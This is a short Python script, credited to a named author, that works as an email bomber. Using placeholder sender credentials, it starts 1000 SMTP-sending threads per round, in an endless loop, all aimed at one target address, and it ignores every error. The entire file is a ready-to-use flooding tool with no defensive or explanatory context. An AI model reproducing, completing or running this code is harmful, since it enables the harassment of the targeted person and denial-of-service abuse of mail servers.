#Creator: Szymon 'Imeldushiii' Kubiak
import smtplib
import threading
number = 0
target = "TARGET EMAIL"
mail = "YOUR EMAIL"
SMTP = "EMAIL SMTP"
PASS = "YOURPSSWORD"
def method1(host,target, smtp, password):
    try:
        global number
        servere = smtplib.SMTP(smtp, 587)
        servere.ehlo()
        servere.starttls()
        servere.login(host, password)
        servere.sendmail(host, target, "MESSAGE")
        number+=1
        print(f'Send: {number} Mails ')
    except:
        pass

def start():
    threads = []
    for i in range(1000):
        th = threading.Thread(target=method1, args=(mail, target,SMTP, PASS))
        threads.append(th)
    for i in range(1000):
        threads[i].start()
while True:
    start()

